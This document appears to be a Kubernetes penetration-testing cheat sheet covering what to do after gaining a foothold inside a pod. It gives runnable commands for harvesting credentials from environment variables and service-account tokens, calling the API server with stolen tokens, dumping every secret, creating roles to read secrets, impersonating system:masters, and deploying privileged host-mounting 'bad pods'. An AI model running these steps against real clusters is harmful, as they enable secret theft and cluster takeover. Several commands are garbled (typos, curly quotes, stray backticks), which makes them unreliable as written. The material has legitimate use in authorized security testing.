### Inside the pod 
0. are you inside the pod? run:`if [[ -z "$KUBERNETES_SERVICE_HOST" ]];then echo false;else echo true;fi`

1. Execute `env`. What to look for?
- Addresses of other services
- Creds from cloud provider, services, db
- Secrets, logins, passwords of other services and other sensetive info

2. File system 
- Application source code
- Configs with sensitive data
- Mounted directories
- Container socket
- Root directory
- Ability to create StaticPod

3. DNS-discovery 
```bash
cat /etc/resolv.conf
env |grep -E '(KUBERNETES|[^_]SERVICE)_PORT=' | sort
```
check kube-apiserver
```bash
curl -k https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/version
```
- search other services
`dig +short srv any.any.svc.cluster.local`
- To retrieve all services in the cluster namespace:
`dig +noall +answer srv any.any.any.svc.cluster.local |sort -k 8`
- set your rDNS records
`dig +noall +answer 10-0-200-20.prometheus-kube-prometheus-kubelet.kube-system.svc.cluster.local. 10-0-200-20.prometheus-kube-prometheus-kubelet.kube-system.svc.cluster.local. 30 IN A 10.0.200.20` 

4. Service account (ServiceAccount defines Pod capabilities in a cluster)
- /run/secrets/kubernetes.io/serviceaccount
- /var/run/secrets/kubernetes.io/serviceaccount
- /secrets/kubernetes.io/serviceaccount
- `kubectl auth can--i --list`i
- run scripts: `https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh` to find the token/secret for each pod running on the node and tell you what each token is authorized to do. It can be run from within a pod that has the host's filesystem mounted to /host, or from outside the pod

5. Interaction with kube-api: via `kubectl`, if you have it. If not: 
- take him: `curl -LO https://storage.googleapis.com/kubernetes-release/release/`curl -s https://storage.googleapis.com/kubernetes-release/release/stable.txt`/bin/linux/amd64/kubectl`
- via kube-apiserver: 
```
KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token) curl -sSk -H "Authorization: Bearer $KUBE_TOKEN" \
https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_PORT_443_TCP_PORT/api/v1/namespaces/default/pods/$HOSTNAME
```
- via /dev/tcp, /dev/udp (http://rus-linux.net/MyLDP/consol/tcp-udp-socket-bash-shell.html) 

6. Try get all secrets in your context: 
```bash 
kubectl get secrets -A -o yaml
``` 
- example: `kubectl get secret --namespace cattle-system bootstrap-secret -o go-template='{{.data.bootstrapPassword|base64decode}}{{"\n"}}'
- also, if you have access to the JWT token with listing secrets permissions, can use curl to get all secrets:
```bash
curl -k -v -H “Authorization: Bearer <jwt_token>” -H “Content-Type: application/json” https://<master_ip>:6443/api/v1/namespaces/default/secrets | jq -r ‘.items[].data’
```
- if you don't have access to the any JWT-token, try create role and service account, and rolebinding to service account for listing secrets:
```bash 
kubectl create -f - << EOF
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  namespace: default
  name: read-secrets
rules:
- apiGroups: [*]
  resources: ["secrets"]
  verbs: ["list"]
EOF
SERVICE_ACCOUNT_NAME="sa1"
kubectl create sa "$SERVICE_ACCOUNT_NAME"
SERVICE_ACCOUNT_SECRET_NAME=`kubectl get secrets $SERVICE_ACCOUNT_NAME -o json | jq -r '.secrets[].name'`
TOKEN=`kubectl get secrets $SERVICE_ACCOUNT_SECRET_NAME -o json | jq -r '.data.name' | base64 -d`
kubectl create rolebinding read-secrets-binding --role=read-secrets --serviceaccount=default:"$SERVICE_ACCOUNT_NAME"
curl -k -v -H “Authorization: Bearer $TOKEN” -H “Content-Type: application/json” https://<master_ip>:6443/api/v1/namespaces/default/secrets | jq -r ‘.items[].data’
```
- if cluster role have rules that allow it to impersonate groups and users, try to list all secrets using **–as=null –as-group=system:masters** it will be granted full permissions:
```bash
kubectl get secrets --context=$CONTEXT_NAME --as=null –as-group=system:masters
```
7. Check threatening pods-right (.items.rules) and try create (or modified) badPods (https://github.com/BishopFox/badPods) or create all badPods  

example of bad pods yaml
```yaml
spec:
  hostNetwork: true   <-- BAD
  hostPID:true        <-- BAD
  hostIPC:true        <-- BAD
  containers:
  - name: ubuntu-test
    image: ubuntu
    securityContext:
      privileged: true        <-- BAD
    volumeMounts:         
    - mountPath: /host
      name: noderoot
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while truel do sleep 30; done;" ]
  volumes:
  - name: noderoot
    hostPath:         <-- BAD
      path: /
		
```
8. Check used vulnerable images
- Get used docker-image of all pods in all namespaces:

```bash
kubectl get pods -A -o go-template='{{range .spec.containers}}{{.image}}{{"\n"}}{{end}}' | sort -u >>  images.list
```

- Exec `apt-get update && apt-get install docker-scan-plugin` and scan `docker scan $IMAGE` (or `cat images.list` | xargs -P 12 -I %i docker scan %i` )

9. Get all external ports of all services in kubernetes cluster 
```bash
kubectl get svc --all-namespaces -o go-template='{{range .items}}{{range.spec.ports}}{{if .nodePort}}{{.nodePort}}{{"\n"}}{{end}}{{end}}{{end}}'`
```


